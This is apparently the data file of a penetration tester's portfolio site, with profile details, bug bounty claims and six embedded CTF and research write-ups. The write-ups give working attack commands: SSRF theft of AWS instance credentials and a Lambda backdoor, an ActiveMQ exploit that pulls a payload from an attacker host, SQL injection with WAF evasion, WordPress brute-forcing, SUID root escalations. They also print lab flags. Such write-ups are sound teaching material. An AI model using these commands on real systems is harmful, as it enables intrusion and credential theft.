/* ============================================================
   data.js — ALL site data lives here.
   Edit this file only. Load it FIRST before everything else.
   ============================================================ */

window.SITE = {
  handle:   "NullSpec7or",
  fullName: "Reupesh Kumar",
  title:    "Penetration Tester & Security Researcher",
  location: "Hyderabad, IN 🇮🇳",
  email:    "nullspec7or@proton.me",
  pgp:      "0xDEAD7EC7",
  resumeUrl:"#",
  taglines: [
    "Penetration Tester",
    "Bug Bounty Hunter",
    "Red Team Operator",
    "CTF Player",
    "Security Researcher",
  ],
  stats: [
    { num:"60+",   label:"Machines Pwned"  },
    { num:"18",    label:"Bug Bounties"    },
    { num:"5",     label:"CVEs Found"      },
    { num:"Top3%", label:"HTB Ranking"    },
  ],
  about: [
    "I'm a penetration tester and vulnerability researcher specialising in web application security, network infra, Active Directory attacks, and critical sector research — government, defence, fintech, railways, automotive.",
    "My approach: understand deeply, chain low issues into critical impact, document everything. I've reported to national defence labs, central government ministries, and Fortune-class enterprises.",
    "Off-engagement I sharpen my edge on <span class='hl'>HackTheBox</span>, <span class='hl'>TryHackMe</span>, and competitive CTFs. Everything I learn goes into public writeups.",
  ],
  skills: [
    { name:"Web App Pentesting",   level:93 },
    { name:"Network Penetration",  level:87 },
    { name:"Active Directory",     level:80 },
    { name:"Bug Bounty Hunting",   level:88 },
    { name:"Cloud Security (AWS)", level:72 },
    { name:"Python / Automation",  level:82 },
    { name:"OSINT & Recon",        level:85 },
    { name:"Reverse Engineering",  level:65 },
  ],
  platforms: [
    { name:"HackTheBox",  rank:"Pro Hacker",  score:"12,450 pts", icon:"🟢", url:"https://app.hackthebox.com" },
    { name:"TryHackMe",   rank:"Top 3%",      score:"48 rooms",   icon:"🔴", url:"https://tryhackme.com"      },
    { name:"BugCrowd",    rank:"Researcher",  score:"P1 × 3",     icon:"🟠", url:"https://bugcrowd.com"       },
    { name:"HackerOne",   rank:"Hacker",      score:"Signal 6.7", icon:"⚪", url:"https://hackerone.com"      },
  ],
  experience: [
    {
      role:"Senior Penetration Tester",
      company:"CyberShield Pvt. Ltd.",
      type:"Full-time",
      period:"Jan 2024 – Present",
      location:"Hyderabad, IN",
      logo:"🛡️",
      summary:"Lead red team engagements for BFSI and government clients across India — web apps, APIs, thick clients, network infra, and cloud.",
      bullets:[
        "Conducted 20+ full-scope pentests including VAPT reports for RBI-regulated entities",
        "Discovered 3 zero-days in widely-used banking middleware — coordinated responsible disclosure",
        "Built Python automation tooling reducing report turnaround by 40%",
        "Mentored 4 junior testers; defined team methodology standards",
      ],
      tags:["Red Team","BFSI","API Security","Zero-Day"],
      redacted:false,
    },
    {
      role:"Security Researcher (Contract)",
      company:"DRDO — Defence R&D Organisation",
      type:"Contract",
      period:"Jun 2023 – Dec 2023",
      location:"Remote",
      logo:"⚔️",
      summary:"Assessed internal web portals, VPN infra, and document management systems used by defence personnel. All findings under NDA.",
      bullets:[
        "Critical IDOR exposing restricted document metadata — Certificate of Appreciation awarded",
        "SQL injection chain discovered in admin portal, reported via private channel",
        "Details redacted per responsible disclosure and NDA obligations",
      ],
      tags:["Defence","NDA","IDOR","SQLi"],
      redacted:true,
    },
    {
      role:"Penetration Tester",
      company:"SecureNet Solutions",
      type:"Full-time",
      period:"Aug 2021 – Dec 2023",
      location:"Hyderabad, IN",
      logo:"🔐",
      summary:"Black-box and grey-box assessments for SaaS, e-commerce, and healthcare. VAPT reports aligned with OWASP, PTES, NIST.",
      bullets:[
        "Completed 50+ web app assessments across diverse industries",
        "Developed custom Burp Suite extensions for client-specific workflows",
        "Earned OSCP during tenure — applied skills to live engagements immediately",
        "Presented findings to C-suite and board-level stakeholders",
      ],
      tags:["VAPT","OWASP","Burp Suite","Healthcare"],
      redacted:false,
    },
    {
      role:"Security Intern",
      company:"TechGuard Labs",
      type:"Internship",
      period:"Jan 2021 – Jul 2021",
      location:"Hyderabad, IN",
      logo:"🎓",
      summary:"Introduced to professional pentesting workflows, vulnerability management, and security documentation.",
      bullets:[
        "Assisted in 10+ VAPT engagements — recon, scanning, initial exploitation phases",
        "Wrote Python scripts for automated subdomain enumeration and port scanning",
        "Earned eJPT certification validating foundational pentesting skills",
      ],
      tags:["Internship","Python","eJPT","Recon"],
      redacted:false,
    },
  ],
  certs: [
    { icon:"🏆", name:"OSCP",         issuer:"Offensive Security",  year:"2023", status:"active"      },
    { icon:"⚔️", name:"CRTO",         issuer:"Zero-Point Security", year:"2025", status:"in-progress" },
    { icon:"🛡️", name:"CEH v12",      issuer:"EC-Council",          year:"2023", status:"active"      },
    { icon:"🎯", name:"BSCP",         issuer:"PortSwigger",         year:"2024", status:"active"      },
    { icon:"🔐", name:"eJPT",         issuer:"eLearnSecurity",      year:"2021", status:"active"      },
    { icon:"☁️", name:"AWS Security", issuer:"Amazon Web Services", year:"2025", status:"in-progress" },
  ],
  bugBounties: [
    { icon:"🏛️", org:"Ministry of Finance — GOI",       sector:"Government", type:"VDP",        severity:"Critical", reward:"Hall of Fame",          year:"2024", description:"Stored XSS chained with CSRF leading to full account takeover of ministry officials.",                      cve:"",              disclosed:false },
    { icon:"⚔️", org:"DRDO (Redacted Division)",         sector:"Defence",    type:"Private",    severity:"Critical", reward:"Cert + ₹50,000",        year:"2023", description:"IDOR exposing classified document metadata and researcher PII. Coordinated privately under NDA.",      cve:"",              disclosed:false },
    { icon:"🚂", org:"Indian Railways — IRCTC",          sector:"Railways",   type:"VDP",        severity:"High",     reward:"Hall of Fame",          year:"2023", description:"SQL injection in ticketing API allowing extraction of passenger PII. Reported via CERT-In.",            cve:"",              disclosed:false },
    { icon:"🏦", org:"Leading UPI Fintech (Redacted)",   sector:"Fintech",    type:"Bug Bounty", severity:"High",     reward:"$2,500",                year:"2024", description:"Auth bypass via JWT algorithm confusion (RS256→HS256) granting admin-level API access.",               cve:"",              disclosed:false },
    { icon:"🚗", org:"Automotive OEM — Tier 1 (NDA)",   sector:"Automotive", type:"Bug Bounty", severity:"Critical", reward:"$5,000",                year:"2025", description:"RCE on vehicle telematics backend via unsafe deserialization. Affected 200k+ vehicle fleet.",          cve:"CVE-2025-XXXXX",disclosed:false },
    { icon:"💊", org:"Global Pharma Corp (Redacted)",    sector:"Pharma",     type:"VDP",        severity:"High",     reward:"Hall of Fame + Swag",   year:"2024", description:"Exposed internal admin panel with default credentials and unrestricted file upload to RCE.",           cve:"",              disclosed:false },
    { icon:"🏥", org:"State Health Dept — GOI",          sector:"Government", type:"VDP",        severity:"High",     reward:"Hall of Fame",          year:"2023", description:"Broken access control in hospital management system exposing patient health records.",                 cve:"",              disclosed:false },
    { icon:"🪖", org:"Military Procurement Portal",      sector:"Military",   type:"Private",    severity:"Critical", reward:"Classified",            year:"2024", description:"SSRF enabling internal network pivot on procurement infrastructure. Details fully redacted.",           cve:"",              disclosed:false },
  ],
  socials: [
    { icon:"🐙", name:"GitHub",       handle:"@NullSpec7or",       url:"https://github.com/NullSpec7or"   },
    { icon:"🐦", name:"Twitter / X",  handle:"@NullSpec7or",       url:"https://twitter.com/NullSpec7or"  },
    { icon:"💼", name:"LinkedIn",     handle:"rahul-kumar-sec",    url:"https://linkedin.com/in/rahul-kumar-sec" },
    { icon:"📧", name:"Email",        handle:"nullspec7or@proton.me", url:"mailto:nullspec7or@proton.me"   },
  ],
};

/* ── Blog posts ─────────────────────────────────────────────── */
window.POSTS = [
  {
    id:"htb-boardlight",
    title:"HackTheBox: BoardLight — Dolibarr RCE & Enlightenment Privesc",
    date:"2025-03-15",
    difficulty:"medium",
    platform:"HackTheBox",
    thumb:"https://i.imgur.com/placeholder1.png",
    tags:["htb","linux","web","rce","privesc","dolibarr"],
    excerpt:"Exploiting CVE-2023-30253 in Dolibarr CRM for initial foothold, then abusing a SUID Enlightenment binary for privilege escalation to root.",
    flags:{ user:"a2d3f1...REDACTED", root:"9f4e2b...REDACTED" },
    content:`
      <h3>Reconnaissance</h3>
      <p>Full port scan reveals Apache on port 80. Vhost fuzzing uncovers <code>crm.board.htb</code> running Dolibarr 17.0.0.</p>
      <pre><code>nmap -sC -sV -p- --min-rate 5000 10.10.11.11
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w subdomains.txt</code></pre>
      <h3>Initial Foothold — CVE-2023-30253</h3>
      <p>Default credentials <code>admin:admin</code> work. PHP injection via uppercase <code>&lt;?PHP</code> tags bypasses the filter.</p>
      <pre><code># Inject reverse shell in Dolibarr dynamic page
# Trigger via public URL
curl "http://crm.board.htb/.../shell.php?c=id"
# uid=33(www-data)</code></pre>
      <h3>Lateral Movement</h3>
      <pre><code>grep -r "password" /var/www/html/dolibarr/conf/
# serverfun2$ — reuse on su larissa — success</code></pre>
      <h3>Privilege Escalation — CVE-2022-37706</h3>
      <pre><code>find / -perm -4000 2>/dev/null | grep enlightenment
enlightenment_sys /bin/mount // --o noexec,nosuid,uid=0 \
  "/../../../../../../../tmp/pwn"
# root shell</code></pre>
      <div class="flag-box">🚩 root: 9f4e2b...REDACTED</div>`,
  },
  {
    id:"ssrf-aws-rce",
    title:"SSRF → IMDSv1 → IAM Theft → Lambda RCE",
    date:"2025-01-20",
    difficulty:"hard",
    platform:"Research",
    thumb:"https://i.imgur.com/placeholder2.png",
    tags:["research","web","ssrf","rce","aws","cloud","iam"],
    excerpt:"Chaining an SSRF bug through AWS IMDSv1 to steal IAM credentials, then abusing Lambda UpdateFunctionCode to achieve RCE on payment processing.",
    content:`
      <h3>SSRF Entry Point</h3>
      <pre><code>GET /preview?url=http://169.254.169.254/latest/meta-data/
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role
# Returns: AccessKeyId, SecretAccessKey, Token</code></pre>
      <h3>Credential Abuse</h3>
      <pre><code>aws configure --profile victim
aws lambda list-functions --profile victim
aws iam get-role-policy --role EC2-Role --profile victim
# Policy: lambda:UpdateFunctionCode ← jackpot</code></pre>
      <h3>Lambda Backdoor → RCE</h3>
      <pre><code>zip payload.zip lambda_function.py
aws lambda update-function-code \
  --function-name ProcessPayments \
  --zip-file fileb://payload.zip --profile victim
aws lambda invoke --function-name ProcessPayments \
  --payload '{"cmd":"id"}' out.json --profile victim</code></pre>
      <div class="flag-box">💰 Impact: RCE on production payment processing Lambda</div>`,
  },
  {
    id:"xss-csp-bypass",
    title:"DOM XSS + Strict CSP Bypass via JSONP",
    date:"2024-10-01",
    difficulty:"hard",
    platform:"Research",
    thumb:"https://i.imgur.com/placeholder3.png",
    tags:["research","web","xss","csp","bypass","javascript","bug-bounty"],
    excerpt:"DOM-based XSS on a target with strict CSP — bypassed using a whitelisted JSONP endpoint on apis.google.com to exfiltrate session tokens. $3,500 bounty.",
    content:`
      <h3>DOM Sink</h3>
      <pre><code>document.getElementById('r').innerHTML =
  decodeURIComponent(location.hash.slice(1));
// PoC
https://target.com/search#&lt;img src=x onerror=alert(origin)&gt;</code></pre>
      <h3>CSP Bypass via JSONP</h3>
      <pre><code>Content-Security-Policy: script-src 'self' https://apis.google.com;
# apis.google.com exposes: /js/plusone.js?onload=CALLBACK
# Final payload injected via hash — CSP allows the script</code></pre>
      <div class="flag-box">💰 Bounty: $3,500 — High severity</div>`,
  },
  {
    id:"htb-broker",
    title:"HackTheBox: Broker — ActiveMQ RCE & sudo nginx",
    date:"2024-11-12",
    difficulty:"easy",
    platform:"HackTheBox",
    thumb:"https://i.imgur.com/placeholder4.png",
    tags:["htb","linux","activemq","cve","rce","sudo","nginx"],
    excerpt:"CVE-2023-46604 unauthenticated RCE on Apache ActiveMQ, then reading root flag via misconfigured sudo nginx serving arbitrary paths.",
    content:`
      <h3>CVE-2023-46604</h3>
      <pre><code>python exploit.py -i 10.10.11.243 -u http://10.10.14.x/poc.xml
# ClassPathXmlApplicationContext → RCE as activemq</code></pre>
      <h3>sudo nginx Privesc</h3>
      <pre><code>sudo -l  # NOPASSWD: /usr/sbin/nginx
cat > /tmp/evil.conf << 'EOF'
user root;
events {}
http { server { listen 9999; root /; autoindex on; }}
EOF
sudo nginx -c /tmp/evil.conf
curl http://localhost:9999/root/root.txt</code></pre>
      <div class="flag-box">🚩 root: [solve it yourself!]</div>`,
  },
  {
    id:"blind-sqli-waf",
    title:"Blind SQLi + WAF Bypass → Admin Takeover",
    date:"2024-12-05",
    difficulty:"easy",
    platform:"CTF",
    thumb:"https://i.imgur.com/placeholder5.png",
    tags:["ctf","web","sqli","waf","sqlmap","mysql"],
    excerpt:"Time-based blind SQLi with WAF — bypassed using charunicodeescape + space2comment tampers to dump admin credentials and capture the flag.",
    content:`
      <h3>Detection</h3>
      <pre><code>username=admin'-- -&password=x  # 5.2s delay → time-based SQLi</code></pre>
      <h3>WAF Bypass</h3>
      <pre><code>sqlmap -u "http://target/login" --data "username=*&password=x" \
  --technique=T --tamper=charunicodeescape,space2comment \
  --dbms=mysql --dump -T users -C username,password_hash</code></pre>
      <h3>Hash Crack</h3>
      <pre><code>hashcat -m 0 hash.txt rockyou.txt
# admin:password123</code></pre>
      <div class="flag-box">🚩 flag{bl1nd_4s_4_b4t_but_st1ll_4_w1n}</div>`,
  },
  {
    id:"thm-mr-robot",
    title:"TryHackMe: Mr. Robot — All 3 Keys",
    date:"2024-08-20",
    difficulty:"medium",
    platform:"TryHackMe",
    thumb:"https://i.imgur.com/placeholder6.png",
    tags:["thm","linux","wordpress","hydra","ctf","suid"],
    excerpt:"Mr. Robot themed room — WordPress brute-force, PHP shell via theme editor, and SUID nmap interactive mode for the root shell.",
    content:`
      <h3>Key 1 via robots.txt</h3>
      <pre><code>curl http://target/robots.txt
# key-1-of-3.txt + fsocity.dic</code></pre>
      <div class="flag-box">🚩 Key 1: 073403c8a58a1f80d943455fb30724b9</div>
      <h3>WordPress → Shell</h3>
      <pre><code>hydra -l Elliot -P fsocity.dic target http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
# Upload PHP shell via Appearance → Theme Editor → 404.php</code></pre>
      <h3>SUID nmap → root</h3>
      <pre><code>nmap --interactive
nmap> !sh  # root</code></pre>
      <div class="flag-box">🚩 Key 3: 04787ddef27c3dee1ee161b21670b4e4</div>`,
  },
];

window.ALL_TAGS = [...new Set(window.POSTS.flatMap(p => p.tags))].sort();
